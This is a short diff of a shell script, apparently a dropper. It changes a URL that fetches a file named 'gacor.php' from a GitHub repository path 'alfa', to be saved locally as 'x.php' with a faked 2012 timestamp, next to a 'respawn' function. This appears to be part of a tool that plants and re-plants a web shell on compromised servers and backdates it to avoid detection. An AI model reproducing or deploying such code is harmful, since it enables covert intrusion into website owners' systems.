@@ -41,7 +41,7 @@ respawn() {
 }
 
 # URL sumber file yang akan diunduh
-url="https://raw.githubusercontent.com/xinz769/mcb/refs/heads/main/alfa/gacor.py"
+url="https://raw.githubusercontent.com/xinz769/mcb/refs/heads/main/alfa/gacor.php"
 file_name="x.php"
 timestamp="201201081531.12"
 
